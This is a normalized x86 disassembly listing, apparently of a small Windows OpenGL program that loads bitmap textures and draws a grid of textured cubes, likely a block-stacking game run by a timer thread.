jne r-xdata
cmp al bl
je r-xdata
dec esi
je r-xdata
cmp cl bl
push ebx
je r-xdata
push 0xffffffff
jmp r-xdata
cmp al bl
je r-xdata
dec esi
je r-xdata
push ebx
push 0xffffffff
push edx
push ebx
jmp r-xdata
cmp cl bl
push ebx
je r-xdata
push 0xffffffff
push ebx
jmp r-xdata
cmp al bl
je r-xdata
dec esi
jne r-xdata
push ebx
push ebx
push 0xf
push [ rw-data ]
call [ PostMessageA@IAT ]
mov ecx rw-data
call sub_403449
jmp r-xdata
push ebx
jmp r-xdata
push edx
push ebx
push edx
push ebx
jmp r-xdata
cmp cl bl
push ebx
je r-xdata
push edx
cmp al bl
je r-xdata
cmp al bl
je r-xdata
mov ecx rw-data
call sub_403334
push ebx
push edx
jmp r-xdata
push 0xffffffff
jmp r-xdata
cmp cl bl
push ebx
je r-xdata
push ebx
push [ rw-data ]
call [ TerminateThread@IAT ]
mov ecx rw-data
call sub_40381c
mov ecx eax
mov eax [ rw-data ]
imul eax ecx
push 0x5
cdq
pop ecx
idiv ecx
add [ rw-data ] eax
call sub_402280
push rw-data
push ebx
push ebx
push sub_402022
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push 0xffffffff
jmp r-xdata
push ebx
push 0xffffffff
jmp r-xdata
sub_40221f
push ebx
push esi
xor ebx ebx
push 0x100
push ebx
push rw-data
mov [ rw-data ] bl
call sub_4043c0
add esp 0xc
mov ecx rw-data
call sub_40383b
mov esi [ PostMessageA@IAT ]
push ebx
push ebx
push 0xf
push [ rw-data ]
call esi
push ebx
push ebx
push 0xf
push [ rw-data ]
call esi
push rw-data
push ebx
push ebx
push sub_402022
push ebx
push ebx
call [ CreateThread@IAT ]
pop esi
mov [ rw-data ] eax
pop ebx
retn
sub_402280
push ebp
mov ebp esp
sub esp 0x3e8
push esi
mov esi rw-data
push edi
mov ecx esi
call sub_403763
mov ecx eax
test ecx ecx
jle r-xdata
mov edi rw-data
mov ecx edi
call sub_4015d9
lea eax [ ebp - 0x3e8 ]
mov ecx esi
push eax
call sub_40374b
cmp [ ebp - 0x208 ] 0x1
jne r-xdata
lea eax [ ecx + 0x1 ]
add [ rw-data ] ecx
imul eax ecx
cdq
sub eax edx
mov edx [ rw-data ]
sar eax 0x1
imul eax [ rw-data ]
add edx eax
push 0xa
pop ecx
lea eax [ edx + eax * 4 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cdq
idiv ecx
mov ecx eax
mov eax 0xbb8
cdq
inc ecx
idiv ecx
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov ecx esi
call sub_403260
mov ecx edi
call sub_40147a
mov [ rw-data ] 0x1
jmp r-xdata
pop edi
pop esi
leave
retn
sub_402359
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x60 ] eax
call [ GetDC@IAT ]
mov [ esi + 0x68 ] eax
lea eax [ esi + 0x50 ]
push eax
push [ esi + 0x60 ]
call [ GetClientRect@IAT ]
mov eax [ esi + 0x5c ]
push ecx
sub eax [ esi + 0x54 ]
push ecx
fild [ esi + 0x58 ]
cdq
fmul [ r--data ]
sub eax edx
sar eax 0x1
mov [ ebp + 0x8 ] eax
fstp [ esi + 0x8 ]
fild [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fld [ esi + 0x48 ]
fmul [ r--data ]
fstp [ esp ]
call sub_404454
fdivr [ ebp - 0x8 ]
pop ecx
pop ecx
mov ecx esi
fstp [ esi + 0x40 ]
call sub_4023e0
push [ esi + 0x5c ]
mov ecx esi
push [ esi + 0x58 ]
call sub_402496
mov ecx esi
call sub_40256b
mov ecx esi
call sub_402530
pop esi
leave
retn 0x4
sub_4023e0
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
lea eax [ ebp - 0x28 ]
mov esi ecx
push eax
xor ebx ebx
push [ esi + 0x68 ]
mov [ ebp - 0x28 ] 0x28
mov [ ebp - 0x26 ] 0x1
mov [ ebp - 0x24 ] 0x25
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] 0x18
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x1b ] bl
mov [ ebp - 0x1a ] bl
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x18 ] bl
mov [ ebp - 0x17 ] bl
mov [ ebp - 0x16 ] bl
mov [ ebp - 0x15 ] bl
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x13 ] bl
mov [ ebp - 0x12 ] bl
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] bl
mov [ ebp - 0xf ] bl
mov [ ebp - 0xe ] bl
mov [ ebp - 0xd ] bl
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ ChoosePixelFormat@IAT ]
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
push [ esi + 0x68 ]
call [ SetPixelFormat@IAT ]
push [ esi + 0x68 ]
call [ wglCreateContext@IAT ]
push eax
mov [ esi + 0x64 ] eax
push [ esi + 0x68 ]
call [ wglMakeCurrent@IAT ]
push 0x30
push rw-data
push rw-data
push ebx
call [ MessageBoxA@IAT ]
xor eax eax
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_402496
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push 0x0
push 0x0
call [ glViewport@IAT ]
mov edi [ glMatrixMode@IAT ]
push 0x1701
call edi
mov ebx [ glLoadIdentity@IAT ]
call ebx
fld [ esi + 0x8 ]
fmul [ r--data ]
push ecx
push ecx
fadd [ esi + 0x40 ]
fadd [ r--data ]
fstp [ esp ]
fld [ esi + 0x40 ]
fsub [ r--data ]
push ecx
push ecx
fstp [ esp ]
fild [ esp + 0x20 ]
push ecx
push ecx
fidiv [ esp + 0x2c ]
fstp [ esp ]
fld [ esi + 0x48 ]
push ecx
push ecx
fstp [ esp ]
call gluPerspective
push 0x1700
call edi
call ebx
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ esi + 0x40 ]
push ecx
fchs
fstp [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call [ glTranslatef@IAT ]
pop edi
pop esi
pop ebx
retn 0x8
sub_402530
push esi
mov esi ecx
push 0x4100
call [ glClear@IAT ]
push 0xde1
call [ glDisable@IAT ]
push [ esi + 0x3c ]
call [ glCallList@IAT ]
mov ecx esi
call sub_402e21
mov ecx esi
call sub_402d23
push [ esi + 0x68 ]
call [ SwapBuffers@IAT ]
pop esi
retn
sub_40256b
push esi
push edi
mov edi ecx
call sub_4025cb
fld1
push ecx
fstp [ esp ]
fld [ r--data ]
push ecx
fst [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call [ glClearColor@IAT ]
push 0x405
call [ glCullFace@IAT ]
mov esi [ glEnable@IAT ]
push 0xb71
call esi
push 0x1102
push 0xc50
call [ glHint@IAT ]
push 0xde1
call esi
mov ecx edi
call sub_402ffc
pop edi
pop esi
retn
sub_4025cb
push ebx
push ebp
push esi
push edi
mov edi [ glGenLists@IAT ]
mov esi ecx
push 0x1
call edi
push 0x2
mov [ esi + 0x3c ] eax
call edi
mov edi [ glNewList@IAT ]
mov ebp 0x1300
push ebp
mov [ esi + 0x38 ] eax
push [ esi + 0x3c ]
call edi
mov ecx esi
call sub_402619
mov ebx [ glEndList@IAT ]
call ebx
push ebp
push [ esi + 0x38 ]
call edi
mov ecx esi
call sub_4028ec
call ebx
pop edi
pop esi
pop ebp
pop ebx
retn
sub_402619
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
lea eax [ ebp - 0x1c ]
push edi
push eax
mov esi ecx
push 0xb00
call [ glGetFloatv@IAT ]
fld [ r--data ]
push ecx
fstp [ esp ]
fld [ r--data ]
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call [ glColor3f@IAT ]
call [ glPushMatrix@IAT ]
fld [ esi + 0x8 ]
fmul [ r--data ]
fldz
push ecx
fstp [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call [ glTranslatef@IAT ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ glBegin@IAT ]
mov edi [ glVertex3f@IAT ]
push 0x2
call ebx
fild [ ebp - 0xc ]
push ecx
fstp [ ebp - 0x4 ]
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
fstp [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fstp [ esp ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fstp [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fstp [ esp ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call edi
call [ glEnd@IAT ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
fild [ ebp - 0x8 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
and [ ebp - 0x8 ] 0x0
fldz
fstp [ ebp - 0x4 ]
push 0x3
call ebx
fld [ esi + 0x8 ]
fmul [ r--data ]
fldz
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
fsubp st1
fstp [ esp ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ esi + 0x8 ]
fmul [ r--data ]
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
fsubp st1
fstp [ esp ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ esi + 0x8 ]
fmul [ r--data ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fsubr st1
fstp [ esp ]
push ecx
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fldz
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fsubr st1
fstp [ esp ]
push ecx
fstp [ esp ]
call edi
call [ glEnd@IAT ]
push 0x3
call ebx
fld [ esi + 0x8 ]
fmul [ r--data ]
fldz
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fstp [ esp ]
push ecx
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
fsubp st1
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ esi + 0x8 ]
fmul [ r--data ]
push ecx
fstp [ esp ]
push ecx
fld st0
fmul [ r--data ]
fstp [ esp ]
push ecx
fmul [ r--data ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
fsubp st1
fstp [ esp ]
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fld [ esi + 0x8 ]
fmul [ r--data ]
push ecx
fstp [ esp ]
push ecx
fst [ esp ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fsubr st1
fstp [ esp ]
fstp st0
call edi
fld [ esi + 0x8 ]
fmul [ r--data ]
fldz
push ecx
fstp [ esp ]
push ecx
fst [ esp ]
fld [ ebp - 0x4 ]
fmul [ esi + 0x8 ]
push ecx
fsubr st1
fstp [ esp ]
fstp st0
call edi
call [ glEnd@IAT ]
inc [ ebp - 0x8 ]
fild [ ebp - 0x8 ]
fst [ ebp - 0x4 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ glColor4fv@IAT ]
call [ glPopMatrix@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_4028ec
push ebp
mov ebp esp
push ecx
push ecx
fld [ ecx + 0x8 ]
fmul [ r--data ]
push ebx
push esi
push edi
push 0x7
fstp [ ebp - 0x4 ]
call [ glBegin@IAT ]
fld1
push ecx
mov ebx [ glNormal3f@IAT ]
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call ebx
mov esi [ glTexCoord2f@IAT ]
push ecx
fldz
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
fchs
fst [ ebp - 0x8 ]
fld [ ebp - 0x4 ]
push ecx
mov edi [ glVertex3f@IAT ]
fstp [ esp ]
push ecx
fst [ esp ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld [ r--data ]
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call ebx
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call ebx
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld [ r--data ]
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call ebx
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call ebx
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
fld [ r--data ]
push ecx
fstp [ esp ]
call ebx
fldz
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fldz
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
fld1
push ecx
fstp [ esp ]
fldz
push ecx
fstp [ esp ]
call esi
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
call edi
call [ glEnd@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_402d23
push ebp
mov ebp esp
sub esp 0x28
push ebx
lea eax [ ebp - 0x28 ]
push esi
push eax
mov esi ecx
push 0xb00
call [ glGetFloatv@IAT ]
lea eax [ ebp - 0x18 ]
push eax
push 0xb40
call [ glGetIntegerv@IAT ]
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call [ glColor3f@IAT ]
mov ebx [ glPolygonMode@IAT ]
push 0x1b01
push 0x408
call ebx
push 0xde1
call [ glDisable@IAT ]
lea eax [ ebp - 0x8 ]
mov ecx rw-data
push eax
call sub_403299
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x28 ]
push eax
call [ glColor4fv@IAT ]
push 0xde1
call [ glEnable@IAT ]
push [ ebp - 0x18 ]
push 0x408
call ebx
pop esi
pop ebx
leave
retn
push edi
xor edi edi
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
add eax edi
fild [ eax ]
fstp [ ebp - 0x14 ]
fild [ eax + 0x4 ]
fstp [ ebp - 0x10 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0xc ]
call [ glPushMatrix@IAT ]
fld [ ebp - 0xc ]
fadd [ r--data ]
push ecx
fmul [ esi + 0x8 ]
fadd [ r--data ]
fstp [ esp ]
fld [ ebp - 0x10 ]
fmul [ esi + 0x8 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x14 ]
fmul [ esi + 0x8 ]
push ecx
fstp [ esp ]
call [ glTranslatef@IAT ]
push [ esi + 0x38 ]
call [ glCallList@IAT ]
call [ glPopMatrix@IAT ]
add edi 0xc
dec [ ebp - 0x4 ]
jne r-xdata
pop edi
sub_402e21
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
lea eax [ ebp - 0x24 ]
push edi
push eax
mov esi ecx
push 0xb00
call [ glGetFloatv@IAT ]
push 0xde1
call [ glEnable@IAT ]
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
fld1
push ecx
fstp [ esp ]
call [ glColor3f@IAT ]
lea eax [ ebp - 0x40c ]
mov ecx rw-data
push eax
call sub_40374b
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ eax + eax * 4 ]
xor edi edi
mov [ ebp - 0x14 ] eax
add [ ebp - 0xc ] 0x4
sub [ ebp - 0x10 ] 0x4
inc ebx
cmp ebx 0x9
jle r-xdata
call [ glPushMatrix@IAT ]
lea eax [ ebx + 0x1 ]
push ecx
mov [ ebp - 0x8 ] eax
lea eax [ edi + 0x1 ]
fild [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
inc eax
fsubr [ r--data ]
fmul [ esi + 0x8 ]
fstp [ esp ]
fild [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x8 ] eax
fmul [ esi + 0x8 ]
fstp [ esp ]
fild [ ebp - 0x8 ]
push ecx
fmul [ esi + 0x8 ]
fstp [ esp ]
call [ glTranslatef@IAT ]
push [ esi + 0x38 ]
call [ glCallList@IAT ]
call [ glPopMatrix@IAT ]
mov eax [ ebp - 0x10 ]
push [ eax ]
push 0xde1
call [ glBindTexture@IAT ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x1
jne r-xdata
inc edi
cmp edi 0x4
jle r-xdata
mov eax [ ebp - 0x14 ]
xor ebx ebx
add eax edi
lea eax [ eax + eax * 4 ]
lea eax [ ebp + eax * 8 - 0x40c ]
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x34 ]
mov [ ebp - 0x10 ] eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jle r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ ebp - 0x24 ]
push eax
call [ glColor4fv@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_402f3c
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
push rw-data
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
call sub_40470d
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0xa
pop ecx
lea esi [ ebp - 0x3c ]
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0x8
push ebx
push 0x1
lea eax [ ebp - 0x14 ]
push 0xe
push eax
call sub_404605
add esp 0x10
cmp [ ebp - 0x14 ] 0x4d42
push ebx
je r-xdata
mov eax [ ebp - 0xa ]
add eax 0xfffffff2
push eax
lea eax [ ebp - 0x68 ]
push 0x1
push eax
call sub_404605
add esp 0x10
lea esi [ ebp - 0x68 ]
lea edi [ ebp - 0x3c ]
push 0xa
pop ecx
[ edi ] [ esi ]
mov esi [ ebp - 0x54 ]
test esi esi
jne r-xdata
call sub_4045af
pop ecx
jmp r-xdata
push esi
call sub_4044f2
mov ecx [ ebp - 0x4 ]
push ebx
push esi
push 0x1
push eax
mov [ ecx + 0xc ] eax
call sub_404605
push ebx
call sub_4045af
add esp 0x18
push [ ebp - 0x60 ]
call sub_4045a4
mov esi eax
pop ecx
movzx eax [ ebp - 0x5a ]
imul eax [ ebp - 0x64 ]
add eax 0x7
push 0x8
cdq
pop ecx
idiv ecx
imul esi eax
sub_402ffc
mov eax sub_40e886
call sub_40425c
sub esp 0x90
push ebx
push esi
lea esi [ ecx + 0x10 ]
push edi
push esi
push 0xa
mov [ ebp - 0x18 ] ecx
call [ glGenTextures@IAT ]
push 0x734
call sub_404772
pop ecx
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_403b68
jmp r-xdata
inc eax
mov [ ebp - 0x14 ] eax
push eax
lea eax [ ebp - 0x74 ]
push rw-data
push eax
call sub_404720
mov ecx [ ebp - 0x18 ]
add esp 0xc
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x9c ]
push eax
call sub_402f3c
push 0xa
mov esi eax
mov eax [ ebp - 0x10 ]
pop ecx
lea edi [ ebp - 0x40 ]
push [ eax ]
[ edi ] [ esi ]
push ebx
call [ glBindTexture@IAT ]
mov eax [ ebp - 0x18 ]
push [ eax + 0xc ]
push 0x1401
push 0x80e0
push 0x0
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push 0x3
push 0x0
push ebx
call [ glTexImage2D@IAT ]
mov esi [ glTexParameteri@IAT ]
mov edi 0x2601
push edi
push 0x2800
push ebx
call esi
push edi
push 0x2801
push ebx
call esi
mov eax [ ebp - 0x14 ]
add [ ebp - 0x10 ] 0x4
cmp eax 0x9
jle r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
mov ecx eax
call sub_403b7c
xor eax eax
mov [ ebp - 0x10 ] esi
mov ebx 0xde1
sub_4030f2
push esi
mov esi ecx
push 0x0
mov [ esi ] r--data
call sub_404780
push eax
call sub_404418
pop ecx
pop ecx
call sub_404422
push 0x5
cdq
pop ecx
idiv ecx
mov ecx esi
mov [ esi + 0x4 ] edx
call sub_40314d
mov ecx esi
call sub_40383b
mov eax esi
pop esi
retn
sub_40314d
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0xc ] 0x5
xor ebx ebx
lea edi [ esi + 0x3f8 ]
mov eax [ ebp - 0x4 ]
push 0x3e8
mov [ eax ] ebx
call [ Sleep@IAT ]
add [ ebp - 0x4 ] 0xc
dec [ ebp - 0x8 ]
jne r-xdata
add edi 0x30
dec [ ebp - 0xc ]
jne r-xdata
push 0x3
lea ecx [ edi + 0x10 ]
pop eax
mov [ ebp - 0x4 ] ecx
mov [ edi - 0x4 ] eax
mov [ edi ] eax
or [ edi + 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
push 0x1
or ecx 0xffffffff
pop eax
mov [ esi + 0x400 ] ebx
mov [ esi + 0x404 ] eax
mov [ esi + 0x40c ] eax
mov [ esi + 0x410 ] eax
mov [ esi + 0x418 ] eax
mov [ esi + 0x41c ] ebx
mov [ esi + 0x430 ] ebx
mov [ esi + 0x434 ] eax
mov [ esi + 0x43c ] ecx
mov [ esi + 0x440 ] ebx
mov [ esi + 0x448 ] eax
mov [ esi + 0x44c ] ebx
mov [ esi + 0x460 ] ecx
mov [ esi + 0x464 ] eax
mov [ esi + 0x46c ] ecx
mov [ esi + 0x470 ] ebx
mov [ esi + 0x478 ] eax
mov [ esi + 0x47c ] ebx
mov [ esi + 0x490 ] ecx
mov [ esi + 0x494 ] eax
mov [ esi + 0x49c ] ebx
mov [ esi + 0x4a0 ] eax
mov [ esi + 0x4a8 ] eax
mov [ esi + 0x4ac ] ebx
mov [ esi + 0x4c0 ] ecx
mov [ esi + 0x4c4 ] ebx
mov [ esi + 0x4cc ] eax
mov [ esi + 0x4d0 ] ebx
mov [ esi + 0x4d8 ] 0x2
mov [ esi + 0x4dc ] ebx
pop edi
pop esi
pop ebx
leave
retn
sub_403260
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] eax
call sub_404422
push 0x5
cdq
pop ecx
idiv ecx
mov eax [ edi + 0x8 ]
push 0xc
pop ecx
lea eax [ eax + eax * 2 ]
shl eax 0x4
lea esi [ eax + edi + 0x3f4 ]
add edi 0x4e4
mov [ edi - 0x4e0 ] edx
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_403299
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
